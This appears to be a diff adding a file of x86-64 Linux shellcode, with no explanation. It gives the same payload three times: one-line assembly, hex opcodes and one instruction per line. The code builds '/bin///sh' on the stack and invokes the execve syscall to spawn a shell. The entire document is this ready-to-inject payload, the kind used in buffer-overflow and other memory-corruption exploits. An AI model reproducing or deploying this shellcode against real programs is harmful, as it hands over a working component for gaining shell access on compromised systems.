@@ -1,0 +1,12 @@
+xor rdx,rdx;xor rsi,rsi;push 0x68;mov rax,0x732f2f2f6e69622f;push rax;mov rdi,rsp;mov rax,0x3b;syscall;
+
+4831d24831f66a6848b82f62696e2f2f2f73504889e748c7c03b0000000f05
+
+xor rdx,rdx;
+xor rsi,rsi;
+push 0x68;
+mov rax,0x732f2f2f6e69622f;
+push rax;
+mov rdi,rsp;
+mov rax,0x3b;
+syscall;
